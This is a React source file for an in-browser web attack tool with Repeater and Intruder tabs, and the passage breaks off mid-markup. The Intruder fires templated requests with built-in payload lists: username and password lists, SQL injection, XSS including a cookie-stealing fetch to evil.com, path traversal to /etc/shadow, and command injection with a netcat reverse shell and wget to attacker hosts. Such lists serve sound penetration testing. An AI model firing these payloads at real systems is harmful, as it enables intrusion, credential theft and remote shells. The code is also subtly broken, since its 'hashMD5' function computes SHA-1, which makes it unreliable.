import { useState, useRef, useCallback, useMemo } from 'react';
import {
  Radar,
  Send,
  Play,
  Square,
  Trash2,
  RotateCcw,
  ArrowRightLeft,
  Layers,
  Hash,
  BarChart3,
  Clock,
  ChevronRight,
  AlertTriangle,
} from 'lucide-react';
import { Card } from '../components/ui/Card.jsx';
import { Input } from '../components/ui/Input.jsx';
import { CopyButton } from '../components/ui/CopyButton.jsx';
import { ToolHelp } from '../components/ui/ToolHelp.jsx';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';
const accent = '#A78BFA';

const codeBlock = {
  fontFamily: mono,
  fontSize: 11,
  lineHeight: '20px',
  background: '#0B0F18',
  borderRadius: 8,
  padding: '14px 16px',
  color: '#D1D5DB',
  whiteSpace: 'pre-wrap',
  wordBreak: 'break-all',
  border: '1px solid rgba(255,255,255,0.04)',
  margin: 0,
  boxSizing: 'border-box',
};

const btnBase = {
  fontFamily: mono,
  fontSize: 11,
  fontWeight: 600,
  padding: '8px 16px',
  borderRadius: 8,
  border: 'none',
  cursor: 'pointer',
  display: 'inline-flex',
  alignItems: 'center',
  gap: 6,
  transition: 'all 0.15s ease',
};

const btnPrimary = {
  ...btnBase,
  background: 'rgba(167,139,250,0.15)',
  color: accent,
  border: `1px solid rgba(167,139,250,0.25)`,
};

const btnDanger = {
  ...btnBase,
  background: 'rgba(251,113,133,0.1)',
  color: '#FB7185',
  border: '1px solid rgba(251,113,133,0.2)',
};

const btnGhost = {
  ...btnBase,
  background: 'transparent',
  color: '#9CA3AF',
  border: '1px solid rgba(255,255,255,0.06)',
};

const labelStyle = {
  fontFamily: mono,
  fontSize: 10,
  fontWeight: 600,
  color: '#6B7280',
  textTransform: 'uppercase',
  letterSpacing: '0.05em',
};

const selectStyle = {
  ...codeBlock,
  padding: '8px 12px',
  cursor: 'pointer',
  outline: 'none',
  appearance: 'none',
  WebkitAppearance: 'none',
};

const statusColor = (code) => {
  if (code >= 200 && code < 300) return '#6EE7B7';
  if (code >= 300 && code < 400) return '#7DD3FC';
  if (code >= 400 && code < 500) return '#FBBF24';
  if (code >= 500) return '#FB7185';
  return '#9CA3AF';
};

const statusBg = (code) => {
  if (code >= 200 && code < 300) return 'rgba(110,231,183,0.1)';
  if (code >= 300 && code < 400) return 'rgba(125,211,252,0.1)';
  if (code >= 400 && code < 500) return 'rgba(251,191,36,0.1)';
  if (code >= 500) return 'rgba(251,113,133,0.1)';
  return 'rgba(156,163,175,0.1)';
};

// ─── Built-in Payload Lists ───

const PAYLOAD_LISTS = {
  'Common Usernames': [
    'admin','root','administrator','user','test','guest','info','adm','mysql','oracle',
    'ftp','pi','puppet','ansible','ec2-user','vagrant','azureuser','www-data','backup',
    'operator','postgres','tomcat','apache','nginx','git','svn','jenkins','deploy',
    'service','manager','webmaster','postmaster','daemon','bin','sys','sync','games',
    'man','lp','mail','news','uucp','proxy','www','nobody','systemd-network','sshd',
    'messagebus','staff','users','nogroup','crontab','syslog','audit',
  ],
  'Common Passwords': [
    'password','123456','12345678','qwerty','abc123','monkey','1234567','letmein',
    'trustno1','dragon','baseball','iloveyou','master','sunshine','ashley','bailey',
    'shadow','123123','654321','superman','qazwsx','michael','football','password1',
    'password123','batman','login','starwars','solo','princess','cheese','welcome',
    'admin','passw0rd','whatever','hello','charlie','donald','cookie','freedom',
    'thunder','access','summer','winter','spring','autumn','secret','changeme',
    'p@ssw0rd','Pa$$w0rd',
  ],
  'SQL Injection': [
    "' OR '1'='1","' OR '1'='1'--","' OR 1=1--","' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--","'; DROP TABLE users;--","1' ORDER BY 1--",
    "' AND 1=1--","' AND 1=2--","admin'--","' OR ''='","') OR ('1'='1",
    "1; WAITFOR DELAY '0:0:5'--","' OR SLEEP(5)--","' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "';EXEC xp_cmdshell('dir');--","' UNION ALL SELECT @@version--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' OR 1=1 LIMIT 1--","' OR 'x'='x","' AND SUBSTRING(@@version,1,1)='5'--",
    "'; INSERT INTO users VALUES('hacked','hacked');--",
    "' UNION SELECT username,password FROM users--",
    "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' OR ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64--",
    "admin' AND '1'='1","' HAVING 1=1--","' GROUP BY columnnames HAVING 1=1--",
    "' UNION SELECT NULL,NULL,NULL--","' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
  ],
  'XSS Payloads': [
    '<script>alert(1)</script>','<img src=x onerror=alert(1)>','<svg onload=alert(1)>',
    '"><script>alert(1)</script>','javascript:alert(1)',
    '<body onload=alert(1)>','<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>','<details open ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">','<math><mtext><table><mglyph><svg onload=alert(1)>',
    '"><img src=x onerror=alert(document.cookie)>',
    "'-alert(1)-'","<a href=javascript:alert(1)>click</a>",
    '<svg/onload=alert(1)>','{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}','<img src=1 onerror=alert`1`>',
    '<script>fetch("https://evil.com?c="+document.cookie)</script>',
    '<div onmouseover=alert(1)>hover</div>',
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//',
    '<base href="javascript:/a/-alert(1)//">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<form action="javascript:alert(1)"><input type=submit>',
    '<isindex action=javascript:alert(1) type=image>',
    '"><svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>',
    '<style>@import"javascript:alert(1)";</style>',
    '<link rel=import href="data:text/html,<script>alert(1)</script>">',
    '<table background="javascript:alert(1)">',
  ],
  'Path Traversal': [
    '../../../etc/passwd','..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd','..%2F..%2F..%2Fetc%2Fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd','..%252f..%252f..%252fetc%252fpasswd',
    '/etc/passwd','C:\\Windows\\System32\\drivers\\etc\\hosts',
    '..\\..\\..\\..\\..\\..\\etc/passwd','....\\....\\....\\etc\\passwd',
    '../../../etc/shadow','../../../etc/hosts',
    '../../../proc/self/environ','../../../var/log/apache2/access.log',
    '../../../var/log/auth.log','..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd',
    '..././..././..././etc/passwd','/proc/self/fd/0',
    '....//....//....//....//etc/passwd',
  ],
  'Command Injection': [
    '; ls -la','| cat /etc/passwd','`whoami`','$(whoami)',
    '; id','| id','& id','&& id','|| id','; uname -a',
    '| nc -e /bin/sh attacker.com 4444','`cat /etc/passwd`',
    '$(cat /etc/shadow)','| curl http://evil.com/$(whoami)',
    '; ping -c 3 attacker.com','| wget http://evil.com/shell.sh',
    '\n/bin/sh','%0a/bin/sh','; echo vulnerable',
    '| rev<<<tac | sh',
  ],
};

// ─── Parse raw HTTP request ───

function parseRawRequest(raw) {
  const lines = raw.split('\n').map((l) => l.replace(/\r$/, ''));
  if (!lines.length) return null;

  const firstLine = lines[0].trim();
  const match = firstLine.match(/^(\w+)\s+(\S+)\s*(HTTP\/[\d.]+)?$/);
  if (!match) return null;

  const method = match[1];
  const path = match[2];
  const headers = {};
  let bodyStart = -1;

  for (let i = 1; i < lines.length; i++) {
    if (lines[i].trim() === '') {
      bodyStart = i + 1;
      break;
    }
    const colonIdx = lines[i].indexOf(':');
    if (colonIdx > 0) {
      const key = lines[i].slice(0, colonIdx).trim();
      const val = lines[i].slice(colonIdx + 1).trim();
      headers[key] = val;
    }
  }

  const body = bodyStart > 0 ? lines.slice(bodyStart).join('\n') : '';
  const host = headers['Host'] || headers['host'] || '';
  const scheme = host.includes('localhost') ? 'http' : 'https';
  const url = path.startsWith('http') ? path : `${scheme}://${host}${path}`;

  return { method, url, path, headers, body, host };
}

function buildCurl(parsed) {
  if (!parsed) return '';
  let cmd = `curl -X ${parsed.method}`;
  Object.entries(parsed.headers).forEach(([k, v]) => {
    cmd += ` \\\n  -H '${k}: ${v}'`;
  });
  if (parsed.body) cmd += ` \\\n  -d '${parsed.body}'`;
  cmd += ` \\\n  '${parsed.url}'`;
  return cmd;
}

// ─── Diff engine ───

function diffLines(a, b) {
  const linesA = a.split('\n');
  const linesB = b.split('\n');
  const result = [];
  const maxLen = Math.max(linesA.length, linesB.length);

  for (let i = 0; i < maxLen; i++) {
    const lineA = i < linesA.length ? linesA[i] : undefined;
    const lineB = i < linesB.length ? linesB[i] : undefined;

    if (lineA === lineB) {
      result.push({ type: 'same', line: lineA, num: i + 1 });
    } else if (lineA === undefined) {
      result.push({ type: 'added', line: lineB, num: i + 1 });
    } else if (lineB === undefined) {
      result.push({ type: 'removed', line: lineA, num: i + 1 });
    } else {
      result.push({ type: 'changed', lineA, lineB, num: i + 1 });
    }
  }
  return result;
}

function diffWords(a, b) {
  const wordsA = a.split(/(\s+)/);
  const wordsB = b.split(/(\s+)/);
  const result = [];
  const maxLen = Math.max(wordsA.length, wordsB.length);

  for (let i = 0; i < maxLen; i++) {
    const wA = wordsA[i];
    const wB = wordsB[i];
    if (wA === wB) result.push({ type: 'same', word: wA });
    else if (wA === undefined) result.push({ type: 'added', word: wB });
    else if (wB === undefined) result.push({ type: 'removed', word: wA });
    else result.push({ type: 'changed', wordA: wA, wordB: wB });
  }
  return result;
}

// ─── Encoding helpers ───

function urlEncode(s) { return encodeURIComponent(s); }
function urlDecode(s) { try { return decodeURIComponent(s); } catch { return '⚠ Invalid URL encoding'; } }
function b64Encode(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch { return '⚠ Encoding failed'; } }
function b64Decode(s) { try { return decodeURIComponent(escape(atob(s.replace(/\s/g, '')))); } catch { return '⚠ Invalid Base64'; } }
function htmlEncode(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
function htmlDecode(s) { const el = document.createElement('textarea'); el.innerHTML = s; return el.value; }
function hexEncode(s) { return Array.from(s).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join(' '); }
function hexDecode(s) { try { return s.trim().split(/\s+/).map(h => String.fromCharCode(parseInt(h,16))).join(''); } catch { return '⚠ Invalid hex'; } }
function asciiHex(s) { return Array.from(s).map(c => '0x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join(' '); }

async function hashMD5(s) {
  const encoder = new TextEncoder();
  const data = encoder.encode(s);
  const hashBuffer = await crypto.subtle.digest('SHA-1', data);
  return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2,'0')).join('');
}

async function hashSHA1(s) {
  const data = new TextEncoder().encode(s);
  const buf = await crypto.subtle.digest('SHA-1', data);
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
}

async function hashSHA256(s) {
  const data = new TextEncoder().encode(s);
  const buf = await crypto.subtle.digest('SHA-256', data);
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
}

function smartDecode(s) {
  const results = [];
  try { const d = atob(s.replace(/\s/g,'')); if (/^[\x20-\x7e\n\r\t]+$/.test(d)) results.push(`Base64 → ${d}`); } catch {}
  try { const d = decodeURIComponent(s); if (d !== s) results.push(`URL → ${d}`); } catch {}
  try { const el = document.createElement('textarea'); el.innerHTML = s; if (el.value !== s) results.push(`HTML → ${el.value}`); } catch {}
  try {
    const hex = s.trim().split(/\s+/);
    if (hex.every(h => /^[0-9a-fA-F]{2}$/.test(h))) {
      const decoded = hex.map(h => String.fromCharCode(parseInt(h,16))).join('');
      results.push(`Hex → ${decoded}`);
    }
  } catch {}
  return results.length ? results.join('\n\n') : 'No common encoding detected';
}

const DECODE_OPS = [
  { label: 'URL Encode', fn: urlEncode },
  { label: 'URL Decode', fn: urlDecode },
  { label: 'Base64 Encode', fn: b64Encode },
  { label: 'Base64 Decode', fn: b64Decode },
  { label: 'HTML Encode', fn: htmlEncode },
  { label: 'HTML Decode', fn: htmlDecode },
  { label: 'Hex Encode', fn: hexEncode },
  { label: 'Hex Decode', fn: hexDecode },
  { label: 'ASCII Hex', fn: asciiHex },
  { label: 'Smart Decode', fn: smartDecode, async: false },
];

// ─── Sequencer helpers ───

function analyzeTokens(tokens) {
  if (!tokens.length) return null;
  const lengths = tokens.map(t => t.length);
  const uniqueSet = new Set(tokens);
  const avgLen = lengths.reduce((a,b) => a+b, 0) / lengths.length;
  const minLen = Math.min(...lengths);
  const maxLen = Math.max(...lengths);
  const maxPos = maxLen;

  const charsets = { hex: /^[0-9a-fA-F]+$/, alphanumeric: /^[a-zA-Z0-9]+$/, base64: /^[A-Za-z0-9+/=]+$/, numeric: /^[0-9]+$/ };
  let detectedCharset = 'mixed';
  for (const [name, re] of Object.entries(charsets)) {
    if (tokens.every(t => re.test(t))) { detectedCharset = name; break; }
  }

  const positionEntropy = [];
  const positionFreqs = [];
  for (let pos = 0; pos < maxPos; pos++) {
    const chars = tokens.filter(t => t.length > pos).map(t => t[pos]);
    const freq = {};
    chars.forEach(c => { freq[c] = (freq[c] || 0) + 1; });
    const total = chars.length;
    let entropy = 0;
    Object.values(freq).forEach(count => {
      const p = count / total;
      if (p > 0) entropy -= p * Math.log2(p);
    });
    positionEntropy.push(entropy);
    positionFreqs.push(freq);
  }

  const overallEntropy = positionEntropy.length
    ? positionEntropy.reduce((a,b) => a+b, 0) / positionEntropy.length
    : 0;

  const patterns = [];
  const sorted = [...tokens].sort();
  let hasIncrementing = false;
  for (let i = 1; i < sorted.length; i++) {
    const a = parseInt(sorted[i-1], 16);
    const b = parseInt(sorted[i], 16);
    if (!isNaN(a) && !isNaN(b) && b - a === 1) hasIncrementing = true;
  }
  if (hasIncrementing) patterns.push('Sequential/incrementing values detected');

  const prefixLen = (() => {
    if (tokens.length < 2) return 0;
    let len = 0;
    for (let i = 0; i < tokens[0].length; i++) {
      if (tokens.every(t => t[i] === tokens[0][i])) len++;
      else break;
    }
    return len;
  })();
  if (prefixLen > 2) patterns.push(`Common prefix of ${prefixLen} characters: "${tokens[0].slice(0, prefixLen)}"`);

  const timestampLike = tokens.some(t => {
    const num = parseInt(t, 10);
    return !isNaN(num) && num > 1600000000 && num < 2000000000;
  });
  if (timestampLike) patterns.push('Possible Unix timestamp values detected');

  const verdict = overallEntropy > 3.5 && !patterns.length
    ? 'Tokens appear random — good entropy'
    : 'Tokens show patterns — potentially predictable';

  return {
    total: tokens.length,
    unique: uniqueSet.size,
    uniquePct: ((uniqueSet.size / tokens.length) * 100).toFixed(1),
    avgLen: avgLen.toFixed(1),
    minLen,
    maxLen,
    detectedCharset,
    positionEntropy,
    positionFreqs,
    overallEntropy: overallEntropy.toFixed(3),
    patterns,
    verdict,
  };
}

// ─── Tab: Repeater ───

function RepeaterTab() {
  const [raw, setRaw] = useState('GET /api/users HTTP/1.1\nHost: httpbin.org\nAccept: application/json');
  const [parsed, setParsed] = useState(null);
  const [response, setResponse] = useState(null);
  const [loading, setLoading] = useState(false);
  const [history, setHistory] = useState([]);

  const handleParse = () => {
    const p = parseRawRequest(raw);
    setParsed(p);
  };

  const handleSend = async () => {
    const p = parsed || parseRawRequest(raw);
    if (!p) return;
    setParsed(p);
    setLoading(true);
    const start = performance.now();
    try {
      const fetchHeaders = { ...p.headers };
      delete fetchHeaders['Host'];
      delete fetchHeaders['host'];
      const res = await fetch(p.url, {
        method: p.method,
        headers: fetchHeaders,
        body: ['GET', 'HEAD'].includes(p.method) ? undefined : p.body || undefined,
      });
      const elapsed = Math.round(performance.now() - start);
      const text = await res.text();
      const respHeaders = {};
      res.headers.forEach((v, k) => { respHeaders[k] = v; });
      const result = { status: res.status, statusText: res.statusText, headers: respHeaders, body: text, time: elapsed, url: p.url, method: p.method };
      setResponse(result);
      setHistory(prev => [{ raw, result, timestamp: Date.now() }, ...prev].slice(0, 20));
    } catch (err) {
      setResponse({ status: 0, statusText: 'Error', headers: {}, body: err.message, time: Math.round(performance.now() - start), error: true });
    }
    setLoading(false);
  };

  const loadHistory = (entry) => {
    setRaw(entry.raw);
    setResponse(entry.result);
    setParsed(parseRawRequest(entry.raw));
  };

  const curlCmd = useMemo(() => buildCurl(parsed || parseRawRequest(raw)), [raw, parsed]);

  const prettyBody = useMemo(() => {
    if (!response?.body) return '';
    try { return JSON.stringify(JSON.parse(response.body), null, 2); } catch { return response.body; }
  }, [response]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      <div style={{ display: 'flex', gap: 14, flexWrap: 'wrap' }}>
        {/* Request Editor */}
        <Card style={{ flex: '1 1 400px', minWidth: 0 }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB' }}>
                Raw Request
              </span>
              <div style={{ display: 'flex', gap: 6 }}>
                <button onClick={handleParse} style={btnGhost}><Layers size={12} /> Parse</button>
                <button onClick={handleSend} disabled={loading} style={{ ...btnPrimary, opacity: loading ? 0.5 : 1 }}>
                  <Send size={12} /> {loading ? 'Sending...' : 'Send'}
                </button>
              </div>
            </div>
            <textarea
              value={raw}
              onChange={(e) => setRaw(e.target.value)}
              spellCheck={false}
              placeholder={'GET /api/endpoint HTTP/1.1\nHost: example.com\nCookie: session=abc'}
              style={{ ...codeBlock, minHeight: 200, resize: 'vertical', outline: 'none', width: '100%' }}
            />
            {parsed && (
              <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
                <span style={{ ...labelStyle, padding: '4px 10px', borderRadius: 6, background: 'rgba(167,139,250,0.1)', color: accent }}>
                  {parsed.method}
                </span>
                <span style={{ fontFamily: mono, fontSize: 10, color: '#9CA3AF', padding: '4px 0' }}>
                  {parsed.url}
                </span>
              </div>
            )}
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={labelStyle}>cURL</span>
              <CopyButton text={curlCmd} />
            </div>
            <pre style={{ ...codeBlock, fontSize: 10, color: '#6EE7B7', maxHeight: 120, overflow: 'auto' }}>
              {curlCmd || 'Parse a request to generate cURL'}
            </pre>
          </div>
        </Card>

        {/* Response Panel */}
        <Card style={{ flex: '1 1 400px', minWidth: 0 }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
            <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB' }}>Response</span>
            {response ? (
              <>
                <div style={{ display: 'flex', gap: 8, alignItems: 'center', flexWrap: 'wrap' }}>
                  <span style={{
                    fontFamily: mono, fontSize: 11, fontWeight: 700, padding: '4px 12px', borderRadius: 6,
                    background: response.error ? 'rgba(251,113,133,0.1)' : statusBg(response.status),
                    color: response.error ? '#FB7185' : statusColor(response.status),
                    border: `1px solid ${response.error ? 'rgba(251,113,133,0.2)' : 'rgba(255,255,255,0.06)'}`,
                  }}>
                    {response.status} {response.statusText}
                  </span>
                  <span style={{ fontFamily: mono, fontSize: 10, color: '#9CA3AF', display: 'flex', alignItems: 'center', gap: 4 }}>
                    <Clock size={10} /> {response.time}ms
                  </span>
                  <span style={{ fontFamily: mono, fontSize: 10, color: '#6B7280' }}>
                    {response.body?.length || 0} bytes
                  </span>
                </div>
                <div>
                  <span style={labelStyle}>Headers</span>
                  <pre style={{ ...codeBlock, fontSize: 10, maxHeight: 100, overflow: 'auto', marginTop: 4 }}>
                    {Object.entries(response.headers).map(([k,v]) => `${k}: ${v}`).join('\n') || 'No headers captured'}
                  </pre>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <span style={labelStyle}>Body</span>
                  <CopyButton text={prettyBody} />
                </div>
                <pre style={{ ...codeBlock, maxHeight: 300, overflow: 'auto' }}>{prettyBody}</pre>
              </>
            ) : (
              <div style={{ ...codeBlock, color: '#3B4252', fontStyle: 'italic', minHeight: 200, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                Send a request to see the response
              </div>
            )}
          </div>
        </Card>
      </div>

      {/* History */}
      {history.length > 0 && (
        <Card>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB' }}>
                History ({history.length})
              </span>
              <button onClick={() => setHistory([])} style={btnGhost}><Trash2 size={11} /> Clear</button>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
              {history.map((entry, i) => (
                <button
                  key={i}
                  onClick={() => loadHistory(entry)}
                  style={{
                    ...codeBlock, fontSize: 10, padding: '8px 12px', cursor: 'pointer', textAlign: 'left',
                    display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                    border: '1px solid rgba(255,255,255,0.04)',
                  }}
                >
                  <span style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ color: accent, fontWeight: 700 }}>{entry.result.method}</span>
                    <span style={{ color: '#9CA3AF' }}>{entry.result.url}</span>
                  </span>
                  <span style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ color: statusColor(entry.result.status), fontWeight: 600 }}>{entry.result.status}</span>
                    <span style={{ color: '#6B7280' }}>{entry.result.time}ms</span>
                    <ChevronRight size={10} style={{ color: '#4B5563' }} />
                  </span>
                </button>
              ))}
            </div>
          </div>
        </Card>
      )}
    </div>
  );
}

// ─── Tab: Intruder ───

function IntruderTab() {
  const [template, setTemplate] = useState('GET /api/users/§admin§ HTTP/1.1\nHost: httpbin.org\nAuthorization: Bearer §token123§');
  const [payloadType, setPayloadType] = useState('Custom');
  const [customPayloads, setCustomPayloads] = useState('admin\nroot\ntest\nuser');
  const [attackType, setAttackType] = useState('sniper');
  const [delay, setDelay] = useState(200);
  const [results, setResults] = useState([]);
  const [running, setRunning] = useState(false);
  const abortRef = useRef(false);

  const positions = useMemo(() => {
    const matches = [];
    const re = /§([^§]+)§/g;
    let m;
    while ((m = re.exec(template)) !== null) matches.push(m[1]);
    return matches;
  }, [template]);

  const payloads = useMemo(() => {
    if (payloadType === 'Custom') return customPayloads.split('\n').filter(Boolean);
    return PAYLOAD_LISTS[payloadType] || [];
  }, [payloadType, customPayloads]);

  const handleAttack = async () => {
    if (!positions.length || !payloads.length) return;
    setRunning(true);
    abortRef.current = false;
    setResults([]);

    const requests = [];
    if (attackType === 'sniper') {
      for (const pos of positions) {
        for (const payload of payloads) {
          const raw = template.replace(`§${pos}§`, payload).replace(/§[^§]+§/g, m => m.slice(1, -1));
          requests.push({ payload, position: pos, raw });
        }
      }
    } else {
      for (const payload of payloads) {
        const raw = template.replace(/§[^§]+§/g, payload);
        requests.push({ payload, position: 'all', raw });
      }
    }

    for (let i = 0; i < requests.length; i++) {
      if (abortRef.current) break;
      const { payload, position, raw } = requests[i];
      const parsed = parseRawRequest(raw);
      if (!parsed) {
        setResults(prev => [...prev, { payload, position, status: 0, length: 0, time: 0, contentType: 'parse error', error: true }]);
        continue;
      }
      const start = performance.now();
      try {
        const headers = { ...parsed.headers };
        delete headers['Host'];
        delete headers['host'];
        const res = await fetch(parsed.url, {
          method: parsed.method,
          headers,
          body: ['GET', 'HEAD'].includes(parsed.method) ? undefined : parsed.body || undefined,
        });
        const text = await res.text();
        const elapsed = Math.round(performance.now() - start);
        const ct = res.headers.get('content-type') || '';
        setResults(prev => [...prev, { payload, position, status: res.status, length: text.length, time: elapsed, contentType: ct }]);
      } catch (err) {
        setResults(prev => [...prev, { payload, position, status: 0, length: 0, time: Math.round(performance.now() - start), contentType: err.message, error: true }]);
      }
      if (delay > 0) await new Promise(r => setTimeout(r, delay));
    }
    setRunning(false);
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      <div style={{ display: 'flex', gap: 14, flexWrap: 'wrap' }}>
        {/* Template */}
        <Card style={{ flex: '1 1 400px', minWidth: 0 }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
            <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB' }}>
              Request Template
            </span>
            <span style={{ fontFamily: mono, fontSize: 10, color: '#6B7280' }}>
              Wrap injection points with § delimiters: §payload§
            </span>
            <textarea
              value={template}
              onChange={(e) => setTemplate(e.target.value)}
              spellCheck={false}
              style={{ ...codeBlock, minHeight: 160, resize: 'vertical', outline: 'none', width: '100%' }}
            />
            {positions.length > 0 && (
              <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                {positions.map((p, i) => (
                  <span key={i} style={{
                    fontFamily: mono, fontSize: 10, padding: '3px 10px', borderRadius: 5,
                    background: 'rgba(167,139,250,0.1)', color: accent, border: '1px solid rgba(167,139,250,0.2)',
                  }}>
                    §{p}§
                  </span>
                ))}
              </div>
            )}
          </div>
        </Card>

        {/* Config */}
        <Card style={{ flex: '0 1 320px', minWidth: 280 }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB' }}>
              Attack Config
            </span>
            <div>
              <span style={labelStyle}>Attack Type</span>
              <div style={{ display: 'flex', gap: 6, marginTop: 6 }}>
                {['sniper', 'battering-ram'].map(t => (
                  <button key={t} onClick={() => setAttackType(t)} style={{
                    ...btnBase, fontSize: 10,
                    background: attackType === t ? 'rgba(167,139,250,0.15)' : 'transparent',
                    color: attackType === t ? accent : '#6B7280',
                    border: `1px solid ${attackType === t ? 'rgba(167,139,250,0.3)' : 'rgba(255,255,255,0.06)'}`,
                  }}>
                    {t === 'sniper' ? 'Sniper' : 'Battering Ram'}
                  </button>
                ))}
              </div>
            </div>
            <div>
              <span style={labelStyle}>Payload List</span>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4, marginTop: 6 }}>
                <select
                  value={payloadType}
                  onChange={(e) => setPayloadType(e.target.value)}
                  style={{ ...selectStyle, width: '100%' }}
                >
                  <option value="Custom">Custom</option>
                  {Object.keys(PAYLOAD_LISTS).map(k => <option key={k} value={k}>{k} ({PAYLOAD_LISTS[k].length})</option>)}
                </select>
              </div>
            </div>
            {payloadType === 'Custom' && (
              <textarea
                value={customPayloads}
                onChange={(e) => setCustomPayloads(e.target.value)}
                placeholder="One payload per line..."
                spellCheck={false}
                style={{ ...codeBlock, minHeight: 80, resize: 'vertical', outline: 'none', width: '100%', fontSize: 10 }}
              />
            )}
            <div>
              <span style={labelStyle}>Delay (ms): {delay}</span>
              <input
                type="range" min={0} max={2000} step={50} value={delay}
                onChange={(e) => setDelay(Number(e.target.value))}
                style={{ width: '100%', marginTop: 6, accentColor: accent }}
              />
            </div>
            <div style={{ display: 'flex', gap: 6 }}>
              <button onClick={handleAttack} disabled={running || !positions.length} style={{ ...btnPrimary, flex: 1, justifyContent: 'center', opacity: running || !positions.length ? 0.5 : 1 }}>
                <Play size={12} /> {running ? 'Running...' : 'Start Attack'}
              </button>
              {running && (
                <button onClick={() => { abortRef.current = true; }} style={btnDanger}>
                  <Square size={12} /> Stop
                </button>
              )}
            </div>
            <span style={{ fontFamily: mono, fontSize: 10, color: '#6B7280' }}>
              {positions.length} position{positions.length !== 1 ? 's' : ''} · {payloads.length} payload{payloads.length !== 1 ? 's' : ''}
            </span>
          </div>
        </Card>
      </div>

      {/* Results Table */}
      {results.length > 0 && (
        <Card>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB' }}>
                Results ({results.length})
              </span>
              <button onClick={() => setResults([])} style={btnGhost}><Trash2 size={11} /> Clear</button>
            </div>
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: 10 }}>
                <thead>
                  <tr style={{ borderBottom: '1px solid rgba(255,255,255,0.06)' }}>
                    {['#', 'Payload', 'Position', 'Status', 'Length', 'Time', 'Content-Type'].map(h => (
                      <th key={h} style={{ ...labelStyle, padding: '8px 10px', textAlign: 'left', whiteSpace: 'nowrap' }}>{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {results.map((r, i) => (
                    <tr key={i} style={{ borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
                      <td style={{ padding: '6px 10px', color: '#4B5563' }}>{i + 1}</td>
                      <td style={{ padding: '6px 10px', color: '#D1D5DB', maxWidth: 200, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{r.payload}</td>
                      <td style={{ padding: '6px 10px', color: '#6B7280' }}>{r.position}</td>
                      <td style={{ padding: '6px 10px' }}>
                        <span style={{ color: statusColor(r.status), fontWeight: 700, padding: '2px 8px', borderRadius: 4, background: statusBg(r.status) }}>
                          {r.status || 'ERR'}
                        </span>
                      </td>
                      <td style={{ padding: '6px 10px', color: '#9CA3AF' }}>{r.length.toLocaleString()}</td>
                      <td style={{ padding: '6px 10px', color: '#9CA3AF' }}>{r.time}ms</td>
                      <td style={{ padding: '6px 10px', color: '#6B7280', maxWidth: 160, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{r.contentType}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </Card>
      )}

      <Card style={{ borderLeft: '3px solid #FBBF24' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
